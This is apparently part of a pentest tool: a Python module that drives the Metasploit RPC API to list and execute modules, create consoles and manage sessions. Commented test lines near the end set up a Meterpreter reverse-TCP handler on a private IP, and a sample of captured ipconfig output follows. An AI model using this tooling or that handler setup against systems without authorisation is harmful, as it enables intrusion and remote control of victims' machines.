import msgpack
import http.client
from ClassCongregation import randoms,GetDatabaseFilePath
import sqlite3
import time
from config import MsfHost,MsfPort,MsfUsername,MsfPasswd
#API文档https://metasploit.help.rapid7.com/docs/standard-api-methods-reference
#Job相关的类未完成
headers = {"Content-type": "binary/message-pack"}

def MSFConnection():#建立连接
    try:
        return http.client.HTTPConnection(MsfHost, MsfPort)
    except:return 0

class MSFTokenDataSheet:#MSF的Token表
    def __init__(self):
        try:
            # 如果数据库不存在的话，将会自动创建一个 数据库
            self.con = sqlite3.connect(GetDatabaseFilePath().result())
            # 获取所创建数据的游标
            self.cur = self.con.cursor()
            # 创建表
            try:
                # 如果设置了主键那么就导致主健值不能相同，如果相同就写入报错
                self.cur.execute("CREATE TABLE MSFToken\
                            (id INTEGER PRIMARY KEY,\
                            uid TEXT NOT NULL,\
                            timestamp TEXT NOT NULL,\
                            token TEXT NOT NULL)")
            except:
                pass
        except:
            pass

    def Write(self,Uid,Token):  # 统一写入
        try:
            self.cur.execute("""INSERT INTO MSFToken (uid,timestamp,token)VALUES (?,?,?)""", (Uid, str(int(time.time())),Token, ))
            # 提交
            self.con.commit()
            self.con.close()
        except:
            pass
    def Inquire(self,Uid):#查询
        try:
            self.cur.execute("""select * from MSFToken where uid =?""", (Uid,))
            values = self.cur.fetchall()
            if len(values)==1:  #如果有参数
                for i in values:
                    return i[3]#提取token
            elif len(values)==0:#如果参数不存在
                return 0
            self.con.close()
        except:
            pass


class MSFTemporaryToken:#获取临时Token
    def __init__(self):
        self.login_api_data= msgpack.packb(["auth.login", MsfUsername, MsfPasswd])
        self.req=MSFConnection()
    def result(self):
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con=msgpack.unpackb(self.req.getresponse().read())#将返回二进制参数进行转码成json
        #print(con[b'token'].decode())
        return con[b'token'].decode()#返回提取的token

class MSFTokenList:#获取Token列表
    def __init__(self):
        self.login_api_data= msgpack.packb(["auth.token_list", MSFTemporaryToken().result()])
        self.req=MSFConnection()
    def result(self):
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con=msgpack.unpackb(self.req.getresponse().read())#将返回二进制参数进行转码成json
        #print(con[b'tokens'])
        list_of_processed_tokens=[]
        for i in con[b'tokens']:
            list_of_processed_tokens.append(i.decode())
        return list_of_processed_tokens#返回处理过的Token

class MSFPermanentToken:#获取永久的令牌
    def __init__(self):
        self.RD=randoms().result(50)
        self.req = MSFConnection()
    def result(self,Uid):
        #先查询这个用户有没有永久token
        self.uid = Uid#获取用户的Uid
        self.login_api_data = msgpack.packb(["auth.token_add", MSFTemporaryToken().result(),self.RD])#掉用两个类分别获取临时token和永久token
        if MSFTokenDataSheet().Inquire(self.uid)==0:#不存在永久令牌
            self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
            for i in MSFTokenList().result():
                if i.find(self.RD)!=-1:#判断令牌是否生重复
                    MSFTokenDataSheet().Write(self.uid,self.RD)#写入数据库中
                    return 1#如果写入成功返回1
        else:return 0


class MSFLoadModuleStats:#返回MSF按类型细分的已加载模块数
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid):
        self.login_api_data = msgpack.packb(["core.module_stats", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        module_stats={#处理byte类型
                "exploits":con[b'exploits'],
                "auxiliary":con[b'auxiliary'],
                "post":con[b'post'],
                "encoders":con[b'encoders'],
                "nops": con[b'nops'],
                "payloads":con[b'payloads']
            }
        #{'exploits': 1949, 'auxiliary': 1090, 'post': 334, 'encoders': 45, 'nops': 10, 'payloads': 558}
        return module_stats # 返回提取的token

class MSFJobList:#返回一个工作清单
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid):
        self.login_api_data = msgpack.packb(["job.list", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        print(con)
        # module_stats = {  # 处理byte类型
        #     "exploits": con[b'exploits'],
        #     "auxiliary": con[b'auxiliary'],
        #     "post": con[b'post'],
        #     "encoders": con[b'encoders'],
        #     "nops": con[b'nops'],
        #     "payloads": con[b'payloads']
        # }
        # {'exploits': 1949, 'auxiliary': 1090, 'post': 334, 'encoders': 45, 'nops': 10, 'payloads': 558}
        #return module_stats  # 返回提取的token


class MSFJobInfo:#返回一个工作的详细信息
    def __init__(self,Uid,JobID):
        self.login_api_data = msgpack.packb(["job.info", MSFTokenDataSheet().Inquire(Uid),JobID])
        self.req = MSFConnection()
    def result(self):
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        print(con)

class MSFJobStop:#停止一个工作
    def __init__(self,Uid,JobID):
        self.login_api_data = msgpack.packb(["job.stop", MSFTokenDataSheet().Inquire(Uid),JobID])
        self.req = MSFConnection()
    def result(self):
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        if con[b'result'].decode()=="success":
            return 1#执行成功
        return 0#执行失败

class MSFGetModuleList:#获取所有的exp
    def __init__(self):
        self.req = MSFConnection()
    def exploits(self,Uid):
        self.login_api_data = msgpack.packb(["module.exploits", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        modules=[]#存放处理后的内容
        for i in con[b'modules']:
            modules.append(i.decode())
        module_stats={"modules":modules}
        return module_stats

    def auxiliary(self,Uid):
        self.login_api_data = msgpack.packb(["module.auxiliary", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        modules=[]#存放处理后的内容
        for i in con[b'modules']:
            modules.append(i.decode())
        module_stats={"modules":modules}
        return module_stats
    def post(self,Uid):
        self.login_api_data = msgpack.packb(["module.post", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        modules=[]#存放处理后的内容
        for i in con[b'modules']:
            modules.append(i.decode())
        module_stats={"modules":modules}
        return module_stats
    def payloads(self,Uid):
        self.login_api_data = msgpack.packb(["module.payloads", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        modules=[]#存放处理后的内容
        for i in con[b'modules']:
            modules.append(i.decode())
        module_stats={"modules":modules}
        return module_stats
    def encoders(self,Uid):
        self.login_api_data = msgpack.packb(["module.encoders", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        modules=[]#存放处理后的内容
        for i in con[b'modules']:
            modules.append(i.decode())
        module_stats={"modules":modules}
        return module_stats
    def nops(self,Uid):
        self.login_api_data = msgpack.packb(["module.nops", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        modules=[]#存放处理后的内容
        for i in con[b'modules']:
            modules.append(i.decode())
        module_stats={"modules":modules}
        return module_stats

class MSFModuleInfo:#返回一个模块的详细信息
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid,ModuleType,ModuleName):
        self.login_api_data = msgpack.packb(["module.info", MSFTokenDataSheet().Inquire(Uid),ModuleType,ModuleName])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        # print(con)
        module_info = {  # 处理byte类型
            "type": con[b'type'].decode(),
            "name": con[b'name'].decode(),
            "fullname": con[b'fullname'].decode(),
            "disclosuredate": con[b'disclosuredate'].decode(),
            "license": con[b'license'].decode(),
            "rank": con[b'rank'].decode(),
        }
        return module_info


class MSFModuleOptions:#返回一个模块设置需要的参数
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid,ModuleType,ModuleName):
        self.login_api_data = msgpack.packb(["module.options", MSFTokenDataSheet().Inquire(Uid),ModuleType,ModuleName])#分别获取token,模块类型,模块名字
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        print(con)


#有问题
class MSFModuleExecute:#返回一个执行的JobID,或者16禁制payload
    def __init__(self):
        self.req = MSFConnection()
    def execute(self,Uid,ModuleType,ModuleName,**kwargs):#这个是启动服务,应该传入完整的字典kwargs
        self.login_api_data = msgpack.packb(["module.execute", MSFTokenDataSheet().Inquire(Uid),ModuleType,ModuleName,kwargs])#分别获取token,模块类型,模块名字，IP和端口
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        return con
    def payload(self,Uid,ModuleType,ModuleName,**kwargs):#这个是生成16禁制payload
        self.login_api_data = msgpack.packb(["module.execute", MSFTokenDataSheet().Inquire(Uid),ModuleType,ModuleName,kwargs])#分别获取token,模块类型,模块名字，IP和端口
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json

        return con

class MSFConsoleCreate:
    def __init__(self):
        self.req = MSFConnection()
    def execute(self,Uid):#这个是启动服务,应该传入完整的字典kwargs
        self.login_api_data = msgpack.packb(["console.create", MSFTokenDataSheet().Inquire(Uid)])#分别获取token,模块类型,模块名字，IP和端口
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        return con

class MSFConsoleDestroy:#删除一个终端
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid,ConsoleID):#最后一个参数是终端ID
        self.login_api_data = msgpack.packb(["console.destroy", MSFTokenDataSheet().Inquire(Uid),ConsoleID])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        return con

class MSFConsoleList:#获取一个终端列表
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid):
        self.login_api_data = msgpack.packb(["console.list", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        return con

class MSFConsoleWrite:#对终端进行写入操作，用法和平时操作msfconsole那样，但需要给不同的命令后加上换行
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid,ConsoleID,Command):#这里别传入用户token,创建的命令行ID,以及命令
        self.login_api_data = msgpack.packb(["console.write", MSFTokenDataSheet().Inquire(Uid),ConsoleID,Command])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        return con

class MSFConsoleRead:#对控制台内容进行读取
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid,ConsoleID):
        self.login_api_data = msgpack.packb(["console.read", MSFTokenDataSheet().Inquire(Uid),ConsoleID])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json

        return con

class MSFConsoleSessionKill:#console.session_kill方法使用Control + C快捷方式模拟用户以中止Metasploit Framework控制台中的交互式会话。
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid,ConsoleID):
        self.login_api_data = msgpack.packb(["console.session_kill", MSFTokenDataSheet().Inquire(Uid),ConsoleID])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json

        return con

class MSFSessionList:
    def __init__(self):
        self.req = MSFConnection()
    def result(self,Uid):
        self.login_api_data = msgpack.packb(["session.list", MSFTokenDataSheet().Inquire(Uid)])
        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
        return con

# MSFPermanentToken().result("123")#初始化
# print(MSFTokenList().result())
# print(MSFTokenDataSheet().Inquire("123"))#获取用户Token
#print(MSFLoadModuleStats().result("123"))
#print(MSFJobList().result("123"))
# print(MSFGetModuleList().encoders("123"))
# print(MSFGetModuleList().nops("123"))
# print(MSFGetModuleList().post("123"))
# print(MSFGetModuleList().payloads("123"))
# print(MSFGetModuleList().auxiliary("123"))
# print(MSFGetModuleList().exploits("123"))
#print(MSFModuleInfo().result("123","exploit","aix/local/ibstat_path"))
#print(MSFModuleExecute().payload("123","exploit","multi/handler",RHOST="192.168.0.152",RPORT="8005",EnableStageEncoding="true"))
print(MSFConsoleCreate().execute("123"))
# print(MSFConsoleList().result("123"))
# print(MSFConsoleDestroy().result("123","2"))
# cmd="""use multi/handler
# set payload windows/meterpreter/reverse_tcp
# set LHOST 192.168.0.152
# set LPORT 4444
# run"""
# print(MSFConsoleWrite().result("123","0",cmd))
# print(MSFConsoleRead().result("123","0"))
#print(MSFConsoleSessionKill().result("123","0"))
# print(MSFSessionList().result("123"))
# by=b'\r\nWindows IP \xc5\xe4\xd6\xc3\r\n\r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xd2\xd4\xcc\xab\xcd\xf8:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n\r\n\xce\xde\xcf\xdf\xbe\xd6\xd3\xf2\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xb1\xbe\xb5\xd8\xc1\xac\xbd\xd3* 2:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n\r\n\xce\xde\xcf\xdf\xbe\xd6\xd3\xf2\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xb1\xbe\xb5\xd8\xc1\xac\xbd\xd3* 11:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 VMware Network Adapter VMnet1:\r\n\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n   \xb1\xbe\xb5\xd8\xc1\xb4\xbd\xd3 IPv6 \xb5\xd8\xd6\xb7. . . . . . . . : fe80::c78:8c04:797d:d24e%6\r\n   IPv4 \xb5\xd8\xd6\xb7 . . . . . . . . . . . . : 192.168.220.1\r\n   \xd7\xd3\xcd\xf8\xd1\xda\xc2\xeb  . . . . . . . . . . . . : 255.255.255.0\r\n   \xc4\xac\xc8\xcf\xcd\xf8\xb9\xd8. . . . . . . . . . . . . : \r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 VMware Network Adapter VMnet8:\r\n\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n   \xb1\xbe\xb5\xd8\xc1\xb4\xbd\xd3 IPv6 \xb5\xd8\xd6\xb7. . . . . . . . : fe80::e977:faa:3153:7acd%12\r\n   IPv4 \xb5\xd8\xd6\xb7 . . . . . . . . . . . . : 192.168.12.1\r\n   \xd7\xd3\xcd\xf8\xd1\xda\xc2\xeb  . . . . . . . . . . . . : 255.255.255.0\r\n   \xc4\xac\xc8\xcf\xcd\xf8\xb9\xd8. . . . . . . . . . . . . : \r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xd2\xd4\xcc\xab\xcd\xf8 2:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n\r\n\xce\xde\xcf\xdf\xbe\xd6\xd3\xf2\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 WLAN:\r\n\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n   \xb1\xbe\xb5\xd8\xc1\xb4\xbd\xd3 IPv6 \xb5\xd8\xd6\xb7. . . . . . . . : fe80::9cd3:62cf:5957:939d%19\r\n   IPv4 \xb5\xd8\xd6\xb7 . . . . . . . . . . . . : 192.168.0.142\r\n   \xd7\xd3\xcd\xf8\xd1\xda\xc2\xeb  . . . . . . . . . . . . : 255.255.255.0\r\n   \xc4\xac\xc8\xcf\xcd\xf8\xb9\xd8. . . . . . . . . . . . . : 192.168.0.1\r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xc0\xb6\xd1\xc0\xcd\xf8\xc2\xe7\xc1\xac\xbd\xd3:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n'
# print(str(by, encoding='gbk' ))